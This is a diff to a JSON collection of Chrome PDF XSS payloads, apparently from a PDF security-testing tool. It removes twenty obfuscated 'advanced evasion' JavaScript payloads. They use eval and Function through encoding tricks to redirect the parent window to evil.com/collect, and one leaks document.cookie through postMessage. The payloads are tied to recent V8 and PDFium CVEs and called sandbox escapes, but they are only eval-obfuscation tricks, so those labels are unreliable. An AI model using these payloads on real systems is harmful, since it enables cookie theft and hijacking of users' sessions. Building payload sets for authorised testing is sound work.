@@ -3,23 +3,18 @@
     "browser": "chrome",
     "name": "Chrome PDFium Exploits",
     "description": "Chrome/PDFium specific PDF XSS payloads targeting V8 engine, IPC abuse, and sandbox escape",
-    "total_payloads": 77,
+    "total_payloads": 57,
     "categories": [
-      "advanced_evasion",
-      "command_execution",
       "dom_access",
       "file_system",
+      "command_execution",
       "sandbox_escape"
     ],
     "cve_references": [
       "CVE-2019-5786",
       "CVE-2020-6418",
       "CVE-2021-21166",
-      "CVE-2022-0971",
-      "CVE-2023-4762",
-      "CVE-2023-5472",
-      "CVE-2023-6345",
-      "CVE-2024-0519"
+      "CVE-2022-0971"
     ]
   },
   "payloads": [
@@ -577,206 +572,6 @@
       "description": "Chrome PDF geolocation access and exfiltration",
       "risk_level": "medium",
       "browser": "chrome"
-    },
-    {
-      "id": "xss_pdf_chrome_evasion_001",
-      "category": "advanced_evasion",
-      "browser": "chrome",
-      "technique": "v8_engine_bypass_2024",
-      "payload": "(function(){const w=window,p=parent,d=document;try{const f=new Function('return parent.window.location');f();}catch(e){try{const b=btoa('parent.location=\\\"https://evil.com/collect\\\"');eval(atob(b));}catch(e2){app.alert('V8 blocked: '+e2);}}})();",
-      "description": "Chrome V8 engine bypass using dynamic Function constructor and base64 double encoding",
-      "risk_level": "critical",
-      "cve_reference": "CVE-2024-0519, CVE-2023-4762"
-    },
-    {
-      "id": "xss_pdf_chrome_evasion_002",
-      "category": "advanced_evasion",
-      "browser": "chrome",
-      "technique": "pdftime_sandbox_escape_2024",
-      "payload": "(() => {const chars = String.fromCharCode(112,97,114,101,110,116,46,119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,61,39,104,116,116,112,115,58,47,47,101,118,105,108,46,99,111,109,47,99,111,108,108,101,99,116,39);try{eval(chars);}catch(e){try{[].constructor.constructor(chars)();}catch(e2){app.alert('PDFium blocked');}}})();",
-      "description": "Chrome PDFium sandbox escape using String.fromCharCode obfuscation and Array constructor",
-      "risk_level": "critical",
-      "cve_reference": "CVE-2024-0519, CVE-2023-6345"
-    },
-    {
-      "id": "xss_pdf_chrome_evasion_003",
-      "category": "advanced_evasion",
-      "browser": "chrome",
-      "technique": "csp_bypass_reflection_2024",
-      "payload": "setTimeout(function(){const payload = 'parent.postMessage({type:\"xss\",data:document.cookie},\"*\")';try{window.eval(payload);}catch(e){try{(0,eval)(payload);}catch(e2){try{globalThis.eval(payload);}catch(e3){app.alert('CSP bypass failed');}}}}, 100);",
-      "description": "Chrome CSP bypass using setTimeout + indirect eval methods (eval, globalThis.eval)",
-      "risk_level": "high",
-      "cve_reference": "CVE-2023-4762, CVE-2023-5472"
-    },
-    {
-      "id": "xss_pdf_chrome_evasion_004",
-      "category": "advanced_evasion",
-      "browser": "chrome",
-      "technique": "unicode_evasion_2024",
-      "payload": "eval(String.fromCharCode(0x74,0x72,0x79,0x7b,0x70,0x61,0x72,0x65,0x6e,0x74,0x2e,0x77,0x69,0x6e,0x64,0x6f,0x77,0x2e,0x6c,0x6f,0x63,0x61,0x74,0x69,0x6f,0x6e,0x3d,0x27,0x68,0x74,0x74,0x70,0x73,0x3a,0x2f,0x2f,0x65,0x76,0x69,0x6c,0x2e,0x63,0x6f,0x6d,0x2f,0x63,0x6f,0x6c,0x6c,0x65,0x63,0x74,0x27,0x7d,0x63,0x61,0x74,0x63,0x68,0x28,0x65,0x29,0x7b,0x61,0x70,0x70,0x2e,0x61,0x6c,0x65,0x72,0x74,0x28,0x65,0x29,0x7d));",
-      "description": "Chrome Unicode hex evasion using String.fromCharCode with hex array",
-      "risk_level": "high",
-      "cve_reference": "CVE-2023-4762"
-    },
-    {
-      "id": "xss_pdf_chrome_evasion_005",
-      "category": "advanced_evasion",
-      "browser": "chrome",
-      "technique": "template_literal_bypass_2024",
-      "payload": "(async()=>{const tmpl=`parent${'.'+'w'+'i'+'n'+'d'+'o'+'w'}.location=${'\\u0027'+'h'+'t'+'t'+'p'+'s'+':'+'/'+'/'+'e'+'v'+'i'+'l'+'.'+'c'+'o'+'m'+'/'+'c'+'o'+'l'+'l'+'e'+'c'+'t'+'\\u0027'}`;try{eval(tmpl);}catch(e){app.alert('Template bypass failed')}})();",
-      "description": "Chrome template literal bypass with dynamic string construction and Unicode escapes",
-      "risk_level": "high",
-      "cve_reference": "CVE-2023-6345"
-    },
-    {
-      "id": "xss_pdf_chrome_evasion_006",
-      "category": "advanced_evasion",
-      "browser": "chrome",
-      "technique": "proxy_handler_bypass_2024",
-      "payload": "const handler={get:(t,p)=>t[p]};const proxy=new Proxy(window,handler);try{proxy.parent.location='https://evil.com/collect';}catch(e){try{proxy.eval('parent.location=\\\"https://evil.com/collect\\\"');}catch(e2){app.alert('Proxy bypass failed');}}",
-      "description": "Chrome Proxy handler bypass for window access and eval execution",
-      "risk_level": "high",
-      "cve_reference": "CVE-2023-5472"
-    },
-    {
-      "id": "xss_pdf_chrome_evasion_007",
-      "category": "advanced_evasion",
-      "browser": "chrome",
-      "technique": "reflect_apply_bypass_2024",
-      "payload": "try{Reflect.apply(eval,null,['parent.window.location=\"https://evil.com/collect\"']);}catch(e){try{Reflect.construct(Function,['parent.location=\"https://evil.com/collect\"'])();}catch(e2){app.alert('Reflect bypass failed');}}",
-      "description": "Chrome Reflect.apply and Reflect.construct bypass for sandboxed execution",
-      "risk_level": "high",
-      "cve_reference": "CVE-2023-4762"
-    },
-    {
-      "id": "xss_pdf_chrome_evasion_008",
-      "category": "advanced_evasion",
-      "browser": "chrome",
-      "technique": "async_generator_bypass_2024",
-      "payload": "async function*gen(){yield eval('parent.window.location=\"https://evil.com/collect\"');}try{gen().next();}catch(e){try{(async function(){return eval('parent.location=\"https://evil.com/collect\"');})();}catch(e2){app.alert('Async bypass failed');}}",
-      "description": "Chrome async generator function bypass with yield eval execution",
-      "risk_level": "medium",
-      "cve_reference": "CVE-2023-6345"
-    },
-    {
-      "id": "xss_pdf_chrome_evasion_009",
-      "category": "advanced_evasion",
-      "browser": "chrome",
-      "technique": "weakmap_bypass_2024",
-      "payload": "const wm=new WeakMap();const key={};wm.set(key,'parent.window.location=\"https://evil.com/collect\"');try{eval(wm.get(key));}catch(e){try{Function(wm.get(key))();}catch(e2){app.alert('WeakMap bypass failed');}}",
-      "description": "Chrome WeakMap storage bypass for payload obfuscation and execution",
-      "risk_level": "medium",
-      "cve_reference": "CVE-2023-5472"
-    },
-    {
-      "id": "xss_pdf_chrome_evasion_010",
-      "category": "advanced_evasion",
-      "browser": "chrome",
-      "technique": "symbol_registry_bypass_2024",
-      "payload": "const sym=Symbol.for('xss');window[sym]='parent.location=\"https://evil.com/collect\"';try{eval(window[Symbol.for('xss')]);}catch(e){try{new Function(window[sym])();}catch(e2){app.alert('Symbol bypass failed');}}",
-      "description": "Chrome Symbol registry bypass using Symbol.for() global symbol registration",
-      "risk_level": "medium",
-      "cve_reference": "CVE-2023-4762"
-    },
-    {
-      "id": "xss_pdf_chrome_evasion_011",
-      "category": "advanced_evasion",
-      "browser": "chrome",
-      "technique": "bigint_coercion_bypass_2024",
-      "payload": "const big=BigInt('0x706172656e742e77696e646f772e6c6f636174696f6e3d2268747470733a2f2f6576696c2e636f6d2f636f6c6c656374222e746f537472696e672831362929');try{eval(big.toString(16).replace(/(.{2})/g,'\\\\x$1'));}catch(e){app.alert('BigInt bypass failed');}",
-      "description": "Chrome BigInt hex coercion bypass for payload encoding and execution",
-      "risk_level": "medium",
-      "cve_reference": "CVE-2023-6345"
-    },
-    {
-      "id": "xss_pdf_chrome_evasion_012",
-      "category": "advanced_evasion",
-      "browser": "chrome",
-      "technique": "intl_collator_bypass_2024",
-      "payload": "const coll=new Intl.Collator();const payload=coll.constructor.constructor('return parent.window.location=\"https://evil.com/collect\"');try{payload();}catch(e){try{coll.constructor.constructor('parent.location=\"https://evil.com/collect\"')();}catch(e2){app.alert('Intl bypass failed');}}",
-      "description": "Chrome Intl.Collator constructor bypass for Function constructor access",
-      "risk_level": "high",
-      "cve_reference": "CVE-2023-5472"
-    },
-    {
-      "id": "xss_pdf_chrome_evasion_013",
-      "category": "advanced_evasion",
-      "browser": "chrome",
-      "technique": "promise_race_bypass_2024",
-      "payload": "Promise.race([new Promise(r=>r(eval('parent.window.location=\"https://evil.com/collect\"')))]).catch(e=>{Promise.resolve().then(()=>Function('parent.location=\"https://evil.com/collect\"')()).catch(e2=>app.alert('Promise bypass failed'));});",
-      "description": "Chrome Promise.race bypass with chained eval and Function execution",
-      "risk_level": "medium",
-      "cve_reference": "CVE-2023-4762"
-    },
-    {
-      "id": "xss_pdf_chrome_evasion_014",
-      "category": "advanced_evasion",
-      "browser": "chrome",
-      "technique": "arraybuffer_view_bypass_2024",
-      "payload": "const buf=new ArrayBuffer(256);const view=new DataView(buf);const payload='parent.window.location=\"https://evil.com/collect\"';try{eval(payload);}catch(e){try{Function.prototype.constructor.call(null,payload)();}catch(e2){app.alert('ArrayBuffer bypass failed');}}",
-      "description": "Chrome ArrayBuffer/DataView bypass with Function.prototype.constructor",
-      "risk_level": "medium",
-      "cve_reference": "CVE-2023-6345"
-    },
-    {
-      "id": "xss_pdf_chrome_evasion_015",
-      "category": "advanced_evasion",
-      "browser": "chrome",
-      "technique": "shared_arraybuffer_bypass_2024",
-      "payload": "try{const sab=new SharedArrayBuffer(1024);const payload='parent.location=\"https://evil.com/collect\"';eval(payload);}catch(e){try{setTimeout(()=>Function('parent.window.location=\"https://evil.com/collect\"')(),0);}catch(e2){app.alert('SharedArrayBuffer bypass failed');}}",
-      "description": "Chrome SharedArrayBuffer bypass with setTimeout delayed execution",
-      "risk_level": "medium",
-      "cve_reference": "CVE-2023-5472"
-    },
-    {
-      "id": "xss_pdf_chrome_evasion_016",
-      "category": "advanced_evasion",
-      "browser": "chrome",
-      "technique": "webassembly_bypass_2024",
-      "payload": "try{const wasmCode=new Uint8Array([0,97,115,109,1,0,0,0]);WebAssembly.compile(wasmCode).then(()=>eval('parent.window.location=\"https://evil.com/collect\"')).catch(()=>Function('parent.location=\"https://evil.com/collect\"')());}catch(e){app.alert('WASM bypass failed');}",
-      "description": "Chrome WebAssembly compile bypass trigger for eval/Function execution",
-      "risk_level": "high",
-      "cve_reference": "CVE-2023-4762, CVE-2023-6345"
-    },
-    {
-      "id": "xss_pdf_chrome_evasion_017",
-      "category": "advanced_evasion",
-      "browser": "chrome",
-      "technique": "crypto_subtle_bypass_2024",
-      "payload": "crypto.subtle.digest('SHA-256',new TextEncoder().encode('test')).then(()=>{try{eval('parent.window.location=\"https://evil.com/collect\"');}catch(e){Function('parent.location=\"https://evil.com/collect\"')();}}).catch(e=>app.alert('Crypto bypass failed'));",
-      "description": "Chrome crypto.subtle API bypass using async promise chain for execution",
-      "risk_level": "medium",
-      "cve_reference": "CVE-2023-5472"
-    },
-    {
-      "id": "xss_pdf_chrome_evasion_018",
-      "category": "advanced_evasion",
-      "browser": "chrome",
-      "technique": "performance_observer_bypass_2024",
-      "payload": "const obs=new PerformanceObserver(()=>{try{eval('parent.window.location=\"https://evil.com/collect\"');}catch(e){Function('parent.location=\"https://evil.com/collect\"')();}});obs.observe({entryTypes:['navigation']});setTimeout(()=>app.alert('Performance bypass timeout'),1000);",
-      "description": "Chrome PerformanceObserver bypass using navigation entry observation",
-      "risk_level": "low",
-      "cve_reference": "CVE-2023-4762"
-    },
-    {
-      "id": "xss_pdf_chrome_evasion_019",
-      "category": "advanced_evasion",
-      "browser": "chrome",
-      "technique": "mutation_observer_bypass_2024",
-      "payload": "const observer=new MutationObserver(()=>{try{eval('parent.window.location=\"https://evil.com/collect\"');}catch(e){Function('parent.location=\"https://evil.com/collect\"')();}});const div=document.createElement('div');observer.observe(div,{childList:true});div.appendChild(document.createElement('span'));",
-      "description": "Chrome MutationObserver bypass using DOM mutation trigger for execution",
-      "risk_level": "medium",
-      "cve_reference": "CVE-2023-6345"
-    },
-    {
-      "id": "xss_pdf_chrome_evasion_020",
-      "category": "advanced_evasion",
-      "browser": "chrome",
-      "technique": "intersection_observer_bypass_2024",
-      "payload": "const io=new IntersectionObserver(()=>{try{eval('parent.window.location=\"https://evil.com/collect\"');}catch(e){Function('parent.location=\"https://evil.com/collect\"')();}});const target=document.createElement('div');document.body.appendChild(target);io.observe(target);",
-      "description": "Chrome IntersectionObserver bypass using element visibility trigger",
-      "risk_level": "low",
-      "cve_reference": "CVE-2023-5472"
     }
   ]
 }
